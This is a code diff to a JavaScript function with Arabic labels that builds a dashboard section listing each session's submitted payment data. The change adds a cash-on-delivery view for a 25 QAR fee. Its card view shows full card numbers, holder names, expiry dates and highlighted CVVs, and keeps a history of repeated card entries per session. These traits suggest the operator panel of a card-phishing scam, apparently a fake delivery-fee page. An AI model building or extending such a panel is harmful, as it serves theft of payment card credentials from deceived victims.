@@ -1705,11 +1705,14 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
   // Title with count and dropdown toggle
   const count = submissions.length;
   const hasHistory = count > 1;
-  const countLabel = hasHistory ? count + ' بطاقات' : 'بطاقة واحدة';
+  
+  // Check if latest is cash or card
+  const isLatestCash = submissions.length > 0 && submissions[0].data.paymentMethod === 'cash';
+  const countLabel = hasHistory ? count + ' مدفوعات' : (isLatestCash ? '💵 دفع نقدي' : 'بطاقة واحدة');
   const arrowIcon = hasHistory ? '▼' : '';
   
   html += '<div class="section-title payment-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
-  html += '<span>💳</span> بيانات الدفع';
+  html += '<span>' + (isLatestCash ? '💵' : '💳') + '</span> ' + (isLatestCash ? 'الدفع النقدي' : 'بيانات الدفع');
   html += '<span style="margin-right:auto;font-size:12px;color:var(--success);font-weight:600;">' + countLabel + '</span>';
   html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
   html += '</div>';
@@ -1720,14 +1723,27 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
     const currentData = current.data;
     const cardNum = currentData.cardNumber || currentData.card_number || '';
     const cvv = currentData.cvv || '';
+    const isCash = currentData.paymentMethod === 'cash';
     
     html += '<div id="paymentCurrent_' + sessionId + '" class="payment-current">';
-    html += '<div class="data-grid">';
-    if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
-    if (currentData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(currentData.cardHolder) + '</span></div>';
-    if (currentData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.expiry) + '</span></div>';
-    if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-    html += '</div>';
+    
+    // If cash payment, show cash message
+    if (isCash) {
+      html += '<div style="padding:12px;background:linear-gradient(135deg, #10b981 0%, #059669 100%);border-radius:8px;color:white;text-align:center;margin-bottom:8px;">';
+      html += '<div style="font-size:24px;margin-bottom:4px;">💵</div>';
+      html += '<div style="font-size:14px;font-weight:600;">دفع عند الاستلام</div>';
+      html += '<div style="font-size:18px;font-weight:700;margin-top:4px;">25 ر.ق</div>';
+      html += '</div>';
+    } else {
+      // Show card data
+      html += '<div class="data-grid">';
+      if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+      if (currentData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(currentData.cardHolder) + '</span></div>';
+      if (currentData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.expiry) + '</span></div>';
+      if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+      html += '</div>';
+    }
+    
     html += '</div>';
   }
   
@@ -1739,18 +1755,28 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
       const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
       const cardNum = subData.cardNumber || subData.card_number || '';
       const cvv = subData.cvv || '';
+      const isCash = subData.paymentMethod === 'cash';
       
       historyItems += '<div class="payment-history-item" style="padding:10px;background:rgba(107,114,128,0.15);border-radius:8px;margin-bottom:8px;border:1px solid rgba(255,255,255,0.1);">';
       historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
-      historyItems += '<span style="font-size:11px;color:#9ca3af;font-weight:600;">البطاقة #' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:11px;color:#9ca3af;font-weight:600;">' + (isCash ? '💵 نقدي' : 'البطاقة #' + (idx + 2)) + '</span>';
       historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
       historyItems += '</div>';
-      historyItems += '<div class="data-grid">';
-      if (cardNum) historyItems += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
-      if (subData.cardHolder) historyItems += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
-      if (subData.expiry) historyItems += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
-      if (cvv) historyItems += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-      historyItems += '</div></div>';
+      
+      if (isCash) {
+        historyItems += '<div style="padding:8px;background:#10b981;border-radius:6px;color:white;text-align:center;">';
+        historyItems += '<div style="font-weight:600;">دفع عند الاستلام</div>';
+        historyItems += '<div style="font-weight:700;font-size:14px;">25 ر.ق</div>';
+        historyItems += '</div>';
+      } else {
+        historyItems += '<div class="data-grid">';
+        if (cardNum) historyItems += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+        if (subData.cardHolder) historyItems += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
+        if (subData.expiry) historyItems += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
+        if (cvv) historyItems += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+        historyItems += '</div>';
+      }
+      historyItems += '</div>';
     });
     
     html += '<div id="paymentHistory_' + sessionId + '" class="payment-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
